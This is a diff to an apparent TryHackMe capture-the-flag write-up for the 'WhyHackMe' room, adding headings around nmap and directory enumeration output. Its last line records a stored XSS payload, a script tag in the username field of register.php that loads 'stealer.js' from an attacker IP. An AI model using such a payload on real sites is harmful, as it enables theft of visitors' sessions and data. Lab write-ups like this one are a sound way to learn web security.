@@ -1,7 +1,7 @@
 Link: https://tryhackme.com/room/whyhackme
-*test text
-#test test 2
 ---
+<h1>Service Enumeration</h1>
+
 <b>┌──(duke㉿kali)-[~/Documents/THM_WhyHackMe]<br>
 └─$ nmap -sV -sC -Pn 10.10.134.235</B><BR>
 <p>Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-08 02:28 CST
@@ -112,6 +112,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /config.php           (Status: 200) [Size: 0]                                     
 /server-status        (Status: 403) [Size: 278] 
 </code>
+
+<h1> web service testing <\h1>
 
 Trying found some XSS or LFI on POST request and found that register.php is vuln via parametr username
 register new user: <script src="http://10.X.X.X:8000/stealer.js"></script>     // attacker ip
